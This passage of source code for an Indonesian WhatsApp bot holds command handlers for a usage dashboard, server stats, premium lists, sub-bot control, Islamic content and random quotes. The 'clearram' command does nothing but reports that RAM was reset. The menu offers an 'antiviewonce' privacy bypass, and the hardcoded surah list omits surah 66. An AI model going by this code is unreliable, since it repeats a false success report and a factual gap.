                "buttonParamsJson": "{\ntitle: 'Setting Bot',\nsections: [\n{\ntitle: 'Anti Hapus/Delete',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antidelete on',\ndescription: 'nyalakan antidelete',\nid: '.antidelete on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antidelete off',\ndescription: 'matikan antidelete',\nid: '.antidelete off'\n}\n]\n},{\ntitle: 'Anti Telpon',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'anticall on',\ndescription: 'nyalakan anticall',\nid: '.anticall on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'anticall off',\ndescription: 'matikan anticall',\nid: '.anticall off'\n}\n]\n},{\ntitle: 'Anti Sekali Lihat',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antiviewonce on',\ndescription: 'nyalakan antiviewonce',\nid: '.antiviewonce on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antiviewonce off',\ndescription: 'matikan antiviewonce',\nid: '.antiviewonce off'\n}\n]\n},{\ntitle: 'Auto Bio',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'autobio on',\ndescription: 'nyalakan autobio',\nid: '.autobio on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'autobio off',\ndescription: 'matikan autobio',\nid: '.autobio off'\n}\n]\n},{\ntitle: 'Auto Block +212',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'autoblok212 on',\ndescription: 'nyalakan autoblok212',\nid: '.autoblok212 on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'autoblok212 off',\ndescription: 'matikan autoblok212',\nid: '.autoblok212 off'\n}\n]\n},{\ntitle: 'Auto Respond',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'autorespond on',\ndescription: 'nyalakan autorespond',\nid: '.autorespond on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'autorespond off',\ndescription: 'matikan autorespond',\nid: '.autorespond off'\n}\n]\n},{\ntitle: 'Auto Read Chat/SW',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'autoread on',\ndescription: 'nyalakan autoread',\nid: '.autoread on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'autoread off',\ndescription: 'matikan autoread',\nid: '.autoread off'\n}\n]\n},{\ntitle: 'Auto Backup Database',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'autobackup on',\ndescription: 'nyalakan autobackup',\nid: '.autobackup on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'autobackup off',\ndescription: 'matikan autobackup',\nid: '.autobackup off'\n}\n]\n},{\ntitle: 'Chat Pribadi Only',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'pconly on',\ndescription: 'nyalakan pconly',\nid: '.pconly on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'pconly off',\ndescription: 'matikan pconly',\nid: '.pconly off'\n}\n]\n},{\ntitle: 'Chat Grup Only',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'gconly on',\ndescription: 'nyalakan gconly',\nid: '.gconly on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'gconly off',\ndescription: 'matikan gconly',\nid: '.gconly off'\n}\n]\n},{\ntitle: 'Set Pengaturan Config.json',\nrows: [\n{\nheader: 'Settings Change 🛠️',\ntitle: 'Settings',\ndescription: 'tampilkan opsi setting',\nid: '.set'\n}\n]\n}\n]\n}"
              }
             ]
await sendButtonDocThumbnail(m.chat, "----------- » *BOT INFO* « -----------", capt, "https://telegra.ph/file/6d9f91f17115f91a44d8f.jpg", button)
}
 db.data.users[m.sender].exp += await randomNomor(20)
break
case 'dashboard':
addCountCmd('dashboard', m.sender, _cmd)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
_cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
_cmd.sort((a, b) => (a.count < b.count) ? 1 : -1)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
var jumlahCmd = _cmd.length
if (jumlahCmd > 10) jumlahCmd = 10
var jumlah = _cmdUser[posi].db.length
if (jumlah > 5) jumlah = 5
var totalUser = 0
for (let x of _cmdUser[posi].db) {
totalUser = totalUser + x.count
}
var total = 0
for (let o of _cmd) {
total = total + o.count
}
var teks = `▢━━「 *DASHBOARD* 」━━▢\n\n*乂 PENGGUNAAN*\n- GLOBAL : ${total}\n- ANDA : ${totalUser}\n\n`
teks += `*乂 COMMAND GLOBAL*\n\n`
for (let u = 0; u < jumlahCmd; u ++) {
teks += `- *#${_cmd[u].nama} dipakai* ${_cmd[u].count} *kali*\n`
}
teks += `\n*乂 COMMAND USER*\n\n`
for (let i = 0; i < jumlah; i ++) {
teks += `- *#${_cmdUser[posi].db[i].nama} dipakai* ${_cmdUser[posi].db[i].count} *kali*\n`
}
let datan = `https://quickchart.io/chart?bkg=white&c=%7B%0A%20%20type%3A%20%27bar%27%2C%0A%20%20data%3A%20%7B%0A%20%20%20%20labels%3A%20%5B%27${_cmd[0].nama}%27%2C%20%27${_cmd[1].nama}%27%2C%20%27${_cmd[2].nama}%27%2C%20%27${_cmd[3].nama}%27%2C%20%27${_cmd[4].nama}%27%2C%20%27${_cmd[5].nama}%27%2C%20%27${_cmd[6].nama}%27%2C%20%27${_cmd[7].nama}%27%2C%20%27${_cmd[8].nama}%27%2C%20%27${_cmd[9].nama}%27%5D%2C%0A%20%20%20%20datasets%3A%20%5B%7B%0A%20%20%20%20%20%20label%3A%20%27Penggunaan%20Command%27%2C%0A%20%20%20%20%20%20data%3A%20%5B${_cmd[0].count}%2C%20${_cmd[1].count}%2C%20${_cmd[2].count}%2C%20${_cmd[3].count}%2C%20${_cmd[4].count}%2C%20${_cmd[5].count}%2C%20${_cmd[6].count}%2C%20${_cmd[7].count}%2C%20${_cmd[8].count}%2C%20${_cmd[9].count}%5D%0A%20%20%20%20%7D%5D%0A%20%20%7D%0A%7D`
vreden.sendMessage(m.chat, {
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: datan,
sourceUrl: 'whatsapp.com',
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'owner': case 'creator': {
let own = `
Hai User
Ini Adalah Creator
Bot WhatsApp, Klik Disini
`
let button = [
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Halo👋\"}`
              }
           ]
let buffer = await getBuffer("https://telegra.ph/file/6f7b009e82d54ac8085ee.png")
await sendButtonDocImage(m.chat, '*🤴 Owner Qioo Official*', own, buffer, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'lopyu': {
await vreden.sendMessage(m.chat, {audio: fs.readFileSync('./media/sound/lopyou.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cekdrive': case 'drive':
var result = await nou.drive.info();
addCountCmd('cekdrive', m.sender, _cmd)
m.reply(`*Drive Server Info*\n\n - *Total :* ${result.totalGb} GB\n - *Used :* ${result.usedGb} GB (${result.usedPercentage}%)\n - *Free :* ${result.freeGb} GB (${result.freePercentage}%)`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cekbandwidth': case 'bandwidth':
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}});
addCountCmd('cekbandwidth', m.sender, _cmd)
var { download, upload } = await checkBandwidth();
m.reply(`*Bandwidth Server*\n\n*>* Upload : ${upload}\n*>* Download : ${download}`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cekprem': case 'cekpremium':
if (!isPremium) return tolakk(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
addCountCmd('cekpremium', m.sender, _cmd)
if (isCreator) return tolakk(`Khusus user aja bkn untuk owner`)
if (_prem.getPremiumExpired(m.sender, premium) == "PERMANENT") return m.reply(`PERMANENT`)
let cekvip = ms(_prem.getPremiumExpired(m.sender, premium) - Date.now())
let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
m.reply(premiumnya)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listpremium': case 'listprem':
addCountCmd('listpremium', m.sender, _cmd)
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = ms(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
vreden.sendTextWithMentions(m.chat, txt, m)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listsewa':
let list_sewa_list = `*LIST-SEWA-GROUP*\n\n*Total:* ${sewa.length}\n\n`
let data_array = [];
for (let x of sewa) {
addCountCmd('listsewa', m.sender, _cmd)
list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
if (x.expired === 'PERMANENT') {
let ceksewa = 'PERMANENT'
list_sewa_list += `*Expire :* PERMANENT\n\n`
} else {
let ceksewa = ms(x.expired - Date.now())
list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
}
}
vreden.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
db.data.users[m.sender].exp += await randomNomor(20)
break
case "jadibot":{
if (!isCreator&&!isPremium) return tolakk('Fitur khusus user premium!')
await vreden.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})   
if (m.key.fromMe) return
jadibot(vreden, m, m.chat)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case "stopjadibot":{
if (!isCreator&&!isPremium) return tolakk('Fitur khusus user premium!')
await vreden.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})   
if (m.key.fromMe) return
stopjadibot(vreden, m.sender)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case "listjadibot":{
if (!isCreator&&!isPremium) return tolakk('Fitur khusus user premium!')
if (m.key.fromMe) return
listjadibot(vreden, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'clearram': {
      var ramUsage = process.memoryUsage().rss
         clearInterval(ramUsage)
         m.reply(`Succes Me-reset Ram Server...`)
         }
         db.data.users[m.sender].exp += await randomNomor(20)
break
case 'speed': case 'ping':{
const used = process.memoryUsage();
const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
let timestamp = speed();
let latensi = speed() - timestamp;
let neww = performance.now();
let tio = await nou.os.oos();
let oldd = performance.now();
var tot = await nou.drive.info();
let respon = `*${pj}JARINGAN SERVER${pj}*
- Ping: ${latensi.toFixed(4)} _Second_ 

*${pj}INFO SERVER${pj}*
- OS: ${tio}
- IP Address: ${nou.os.ip()}
- Type OS: ${nou.os.type()}

*${pj}RAM :${pj}*
- Total: ${formatp(os.totalmem())}
- Digunakan: ${formatp(os.totalmem() - os.freemem())}

*${pj}PENYIMPANAN :${pj}*
- Total: ${tot.totalGb} GB
- Digunakan: ${tot.usedGb} GB (${tot.usedPercentage}%)
- Tersedia: ${tot.freeGb} GB (${tot.freePercentage}%)

*${pj}RUNTIME SERVER${pj}*
Aktif:
${runtime(process.uptime())}

*${pj}CPU USAGE (${cpus.length} CORE CPU)${pj}*
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}

> ${footxt}`.trim();
let imgso = `https://quickchart.io/chart?v=2.9.4&c=%7B%0A%20%20type%3A%20%27doughnut%27%2C%0A%20%20data%3A%20%7B%0A%20%20%20%20datasets%3A%20%5B%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20data%3A%20%5B${tot.freePercentage}%2C%20${tot.usedPercentage}%5D%2C%0A%20%20%20%20%20%20%20%20backgroundColor%3A%20%5B%27%2326AC00%27%2C%20%27red%27%5D%2C%0A%20%20%20%20%20%20%20%20label%3A%20%27Dataset%201%27%2C%0A%20%20%20%20%20%20%20%20borderWidth%3A%200%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%5D%2C%0A%20%20%20%20labels%3A%20%5B%27A%27%2C%20%27C%27%5D%2C%0A%20%20%7D%2C%0A%20%20options%3A%20%7B%0A%20%20%20%20circumference%3A%20Math.PI%2C%0A%20%20%20%20rotation%3A%20Math.PI%2C%0A%20%20%20%20cutoutPercentage%3A%2075%2C%0A%20%20%20%20layout%3A%20%7B%0A%20%20%20%20%20%20padding%3A%2080%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20legend%3A%20%7B%0A%20%20%20%20%20%20display%3A%20false%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20plugins%3A%20%7B%0A%20%20%20%20%20%20datalabels%3A%20%7B%0A%20%20%20%20%20%20%20%20color%3A%20%27%23404040%27%2C%0A%20%20%20%20%20%20%20%20anchor%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20align%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20formatter%3A%20(val)%20%3D%3E%20val%20%2B%20%27%25%27%2C%0A%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20doughnutlabel%3A%20%7B%0A%20%20%20%20%20%20%20%20labels%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5CnPing%20Status%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20size%3A%2020%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5Cn${latensi.toFixed(4)}s%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%27%23000%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%5D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D`
vreden.sendMessage(m.chat, {
text: respon,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {  
title: ucapanWaktu,
thumbnailUrl: imgso,
sourceUrl: 'https://control.vreden.my.id/plans.html',
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
//━━━━━━━━━━━━━━━[ ISLAMIC ]━━━━━━━━━━━━━━━━━//
case 'kisahnabi':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Ketik nama Nabi\nContoh : ${prefix+command} Muhammad`) 
try{
let tod = await fetchJson(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)//perlu ganti
const name = tod.name
const ultah = tod.thn_kelahiran
const umur = tod.usia
const asal = tod.tmp
const cerita = tod.description
var kisah = `_*Kisah Nabi*_
Nama Nabi : ${name}
Hari Kelahiran : ${ultah}
Umur : ${umur}
Asal : ${asal}

Kisah Nabi *${name}* :
${cerita}`
m.reply(kisah) 
}catch (error) {
console.log(error)
m.reply(`Ketik Nama Nabi Yang Valid\n*Contoh* : ${prefix + command} adam`);
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'asmaulhusna':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
try{
let todi = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-islami/main/AsmaulHusna.json`) 
const tod = await pickRandom(todi.result)
const ke = tod.number
const latin = tod.latin
const arab = tod.arab
const indo = tod.translate_id
const english = tod.translate_en
var asmaul = `_*Random Asmaul Husna*_
Asmaul Husna Ke : ${ke}
Teks Arab : ${arab}
Teks Latin : ${latin}
Arti Dalam Bahasa Indonesia : ${indo}
Arti Dalam Bahasa Inggris : ${english}`
m.reply(asmaul) 
}catch (error) {
m.reply(`Maaf Terjadi Kesalahan`);
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listsurah': case 'listsurat':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
try{
var surah = `_*List Surah*_

1. Al Fatihah (Pembuka)
2. Al Baqarah (Sapi Betina)
3. Ali Imran (Keluarga Imran)
4. An Nisa (Wanita)
5. Al Ma'idah (Jamuan)
6. Al An'am (Hewan Ternak)
7. Al-A'raf (Tempat yang Tertinggi)
8. Al-Anfal (Harta Rampasan Perang)
9. At-Taubah(Pengampunan)
10. Yunus (Nabi Yunus)
11. Hud (Nabi Hud)
12. Yusuf (Nabi Yusu)
13. Ar-Ra'd (Guruh)
14. Ibrahim (Nabi Ibrahim)
15. Al-Hijr (Gunung Al Hijr)
16. An-Nahl (Lebah)
17. Al-Isra' (Perjalanan Malam)
18. Al-Kahf (Penghuni-penghuni Gua)
19. Maryam (Maryam)
20. Ta Ha (Ta Ha)
21. Al-Anbiya (Nabi-Nabi)
22. Al-Hajj (Haji)
23. Al-Mu'minun (Orang-orang mukmin)
24. An-Nur (Cahaya)
25. Al-Furqan (Pembeda)
26. Asy-Syu'ara' (Penyair)
27. An-Naml (Semut)
28. Al-Qasas (Kisah-kisah)
29. Al-'Ankabut (Laba-laba)
30. Ar-Rum (Bangsa Romawi)
31. Luqman (Keluarga Luqman)
32. As-Sajdah (Sajdah)
33. Al-Ahzab (Golongan-golongan yang Bersekutu)
34. Saba' (Kaum Saba')
35. Fatir (Pencipta)
36. Ya Sin (Yaasiin)
37. As-Saffat (Barisan-barisan)
38. Sad (Shaad)
39. Az-Zumar (Rombongan-rombongan)
40. Ghafir (Yang Mengampuni)
41. Fussilat (Yang Dijelaskan)
42. Asy-Syura (Musyawarah)
43. Az-Zukhruf (Perhiasan)
44. Ad-Dukhan (Kabut)
45. Al-Jasiyah (Yang Bertekuk Lutut)
46. Al-Ahqaf (Bukit-bukit Pasir)
47. Muhammad (Nabi Muhammad)
48. Al-Fath (Kemenangan)
49. Al-Hujurat (Kamar-kamar)
50. Qaf (Qaaf)
51. Az-Zariyat (Angin yang Menerbangkan)
52. At-Tur (Bukit)
53. An-Najm (Bintang)
54. Al-Qamar (Bulan)
55. Ar-Rahman (Yang Maha Pemurah)
56. Al-Waqi'ah (Hari Kiamat)
57. Al-Hadid (Besi)
58. Al-Mujadilah (Wanita yang Mengajukan Gugatan)
59. Al-Hasyr (Pengusiran)
60. Al-Mumtahanah (Wanita yang Diuji)
61. As-Saff (Satu Barisan)
62. Al-Jumu'ah (Hari Jum'at)
63. Al-Munafiqun (Orang-orang yang Munafik)
64. At-Tagabun (Hari Dinampakkan Kesalahan-kesalahan)
65. At-Talaq (Talak)
67. Al-Mulk (Kerajaan)
68. Al-Qalam (Pena)
69. Al-Haqqah (Hari Kiamat)
70. Al-Ma'arij (Tempat Naik)
71. Nuh (Nabi Nuh)
72. Al-Jinn (Jin)
73. Al-Muzzammil (Orang yang Berselimut)
74. Al-Muddassir (Orang yang Berkemul)
75. Al-Qiyamah (Kiamat)
76. Al-Insan (Manusia)
77. Al-Mursalat (Malaikat-Malaikat Yang Diutus)
78. An-Naba' (Berita Besar)
79. An-Nazi'at (Malaikat-Malaikat Yang Mencabut)
80. 'Abasa (Ia Bermuka Masam)
81. At-Takwir (Menggulung)
82. Al-Infitar (Terbelah)
83. Al-Tatfif (Orang-orang yang Curang)
84. Al-Insyiqaq (Terbelah)
85. Al-Buruj (Gugusan Bintang)
86. At-Tariq (Yang Datang di Malam Hari)
87. Al-A'la (Yang Paling Tinggi)
88. Al-Gasyiyah (Hari Pembalasan)
89. Al-Fajr (Fajar)
90. Al-Balad (Negeri)
91. Asy-Syams (Matahari)
92. Al-Lail (Malam)
93. Ad-Duha (Waktu Matahari Sepenggalahan Naik (Dhuha))
94. Al-Insyirah (Melapangkan)
95. At-Tin (Buah Tin)
96. Al-'Alaq (Segumpal Darah)
97. Al-Qadr (Kemuliaan)
98. Al-Bayyinah (Pembuktian)
99. Az-Zalzalah (Kegoncangan)
100. Al-'Adiyat (Berlari Kencang)
101. Al-Qari'ah (Hari Kiamat)
102. At-Takasur (Bermegah-megahan)
103. Al-'Asr (Masa)
104. Al-Humazah (Pengumpat)
105. Al-Fil (Gajah)
106. Quraisy (Suku Quraisy)
107. Al-Ma'un (Barang-barang yang Berguna)
108. Al-Kausar (Nikmat yang Berlimpah)
109. Al-Kafirun (Orang-orang Kafir)
110. An-Nasr (Pertolongan)
111. Al-Lahab (Gejolak Api)
112. Al-Ikhlas (Ikhlas)
113. Al-Falaq (Waktu Subuh)
114. An-Nas (Umat Manusia)

`
m.reply(surah) 
}catch (error) {
m.reply(`Maaf Terjadi Kesalahan`);
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'randomquran':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
try{
let todi = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-islami/main/quranaudio.json`)
const tod = await pickRandom(todi)
const arti = tod.asma.translation.id
const audio = tod.audio
const asma = tod.asma.ar.short
const ayat = tod.ayatCount
const keterangan = tod.tafsir
const nama = tod.asma.id.short
const nomor = tod.number
const tempat = tod.type
var quran = `*乂 RANDOM QURAN*

*Nama* : ${nama}
*Asma* : ${asma}
*Surat Ke* : ${nomor}
*Arti* : ${arti}
*Total Ayat* : ${ayat}
*Type* : ${tempat}
*Keterangan* : ${keterangan}\n\n_Loading Audio..._`
await m.reply(quran) 
await vreden.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
m.reply(`Maaf Terjadi Kesalahan`);
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'jadwalsholat': case 'sholat': {
if (!text) return warning(`Masukkan Wilayah-nya\nContoh : ${prefix+command} Semarang`)  
try{
const iddae = await findKodeDaerah(text)
const res = await jadwalSholat(iddae.kode_daerah)
balas(`*乂 JADWAL - SHOLAT*\n\n${Object.entries(res).map(([name, data]) => `- *${name}* : ${data}`).join('\n').trim()}\n\n> ${footxt}`)
}catch (error) {
m.reply(`Masukan Daerah Yang Valid`)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'quranaudio': case 'alquranaudio': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Masukkan Suratnya\nContoh : ${prefix+command} 1\n\nKetik .listsurah Untuk Melihat Daftar Surat`)  
try{
let todi = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-islami/main/quranaudio.json`)
const tod = await todi[text - 1]
const arti = tod.asma.translation.id
const audio = tod.audio
const asma = tod.asma.ar.short
const ayat = tod.ayatCount
const keterangan = tod.tafsir
const nama = tod.asma.id.short
const nomor = tod.number
const tempat = tod.type
var quran = `*乂 QURAN AUDIO*

*Nama* : ${nama}
*Asma* : ${asma}
*Surat Ke* : ${nomor}
*Arti* : ${arti}
*Total Ayat* : ${ayat}
*Type* : ${tempat}
*Keterangan* : ${keterangan}\n\n_Loading Audio..._`
await m.reply(quran)
await vreden.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
m.reply(`Maaf Terjadi Kesalahan`);
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
//━━━━━━━━━━━━━━━[ RANDOM ]━━━━━━━━━━━━━━━━━//
case 'bucin': case 'quotesbucin':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const bucin = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/bucin.json`)
const bucc = await pickRandom(bucin)
vreden.sendMessage(m.chat, {text: bucc }, {quoted: m})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'dilan': case 'quotesdilan':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
let tod = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden/main/quotesdilan.json`)
const dilan = await pickRandom(tod)
vreden.sendMessage(m.chat, {text: dilan.quotes }, {quoted: m})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'quotesanime': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const quotesanim = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/quotesanime.json`)
const anu = await pickRandom(quotesanim)
let cap = `\n"${anu.quotes}"\n\n*${anu.char_name}*\n_${anu.anime} (${anu.episode})_\n_${anu.date}_`
let button = [
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Url Quotes\",\"url\":\"${anu.url}\",\"merchant_url\":\"${anu.url}\"}`
              }
           ]
let buffer = await getBuffer("https://telegra.ph/file/fb7b3703f76277ee4eb25.png")
await sendButtonDocImage(m.chat, '*Quotes Anime🥶*', cap, buffer, button)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'galau': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const galau = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/katagalau.json`)
const galaunya = await pickRandom(galau)
m.reply(`${galaunya}`)
const so = ['galau1', 'galau2', 'galau3', 'galau4','galau5','galau6','galau7','galau8']
const ga = await pickRandom(so)
backsoundnya = fs.readFileSync(`./media/sound/${ga}.mp3`)
vreden.sendMessage(m.chat, {audio: backsoundnya, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'katabijak': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const bijak = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/katabijak.json`)
const katabijak = await pickRandom(bijak)
m.reply(`${katabijak}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'katacinta': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const cinta = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/katacinta.json`)
const katacinta = await pickRandom(cinta)
m.reply(`${katacinta}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'katahacker': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const hacker = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/katahacker.json`)
const katahacker = await pickRandom(hacker)
m.reply(`${katahacker}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
